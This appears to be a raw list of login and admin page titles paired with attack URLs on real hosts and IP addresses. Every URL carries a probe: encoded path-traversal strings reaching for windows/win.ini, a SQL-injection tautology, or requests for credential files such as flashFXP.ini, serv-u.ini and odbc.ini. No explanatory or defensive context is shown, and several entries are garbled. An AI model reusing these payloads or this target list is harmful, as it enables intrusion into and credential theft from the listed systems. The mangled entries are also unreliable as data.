PHPBTTracker - Login,http://210-242-146-178.hinet-ip.hinet.net/login/lib/wwwroot/flashFXP.ini
admin,http://61-64-230-150-adsl-tpe.dynamic.so-net.net.tw/comments/lib/perform.ini
Welcome to F-Secure Policy Manager Server Welcome Page,http://61.67.24.158/login/servlet/cgi-bin/perform.ini
plesk,http://cy210-202-233-161.ell.static.apol.com.tw/login-us/textpattern/admin//.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255C.%255C..%255Cwindows/win.ini
Multimon UPS status page,http://210.202.233.142/login/%2522nph-proxy.cgi/perform.ini
AppServ Open Project,http://210.202.233.167/login/0x5c..0x5c..0x5c..0x5c..................windowswin.inix5c..0x5c..0x5c..0x5cwindows/win.ini
admin.php - Login to @Mail,http://rdmail.rd.fic.com.tw/comments)%2520and%25209033%3D9033-file:///etc/servlet/odbc.ini
please login,http://210.242.146.155/comments/search/modules/vwar/admin/cgi-bin/serv-u.ini
Execution,http://210.242.147.161/comments/ConnectComputer/lib/2082/flashFXP.ini
Nessus Scan Report,http://210.242.147.133/login/admin/log/2082/flashFXP.ini
EverFocus.EDSR.app<-b>let,http://ip20.ip-137-74-255.eu:8888/login.cfm/1220/preferences.ini
EZPartner,https://137.74.255.20/login/pages/view/perform.ini
